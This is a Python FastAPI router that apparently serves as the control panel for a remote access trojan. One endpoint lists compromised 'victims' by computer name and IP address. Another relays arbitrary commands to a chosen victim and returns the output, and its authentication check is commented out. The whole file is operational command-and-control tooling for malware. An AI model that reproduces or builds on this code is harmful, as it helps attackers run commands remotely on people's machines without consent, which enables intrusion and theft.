from fastapi import Depends, APIRouter
from auth.dependencies import *
from models.user import User
from host.server import RAT_SERVER
import urllib.parse

app = APIRouter()

@app.get("/clients")
async def read_users_me():

    prettyClients = []
    print(RAT_SERVER.instance.victims)
    for client in RAT_SERVER.instance.victims:
        prettyClients.append(
            {"name": client["Name of Computer"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    return {"clients": prettyClients}


@app.post("/clients/{client_ip}/command")
async def execute_command(client_ip: str, command: str):
    # if current_user:

    command = urllib.parse.unquote(command)

    print(f"[*] Sending command {command} to {client_ip}")
    for client in RAT_SERVER.instance.clients:
        if client_ip == client[1][0]:
            RAT_SERVER.instance.execute(command, client[0])
            output = RAT_SERVER.instance.receive_output(client[0])

            if output is None:
                return {"output": "Error: Output not received"}
            return {"output": output}
    return {"output": "Error: Client not found"}
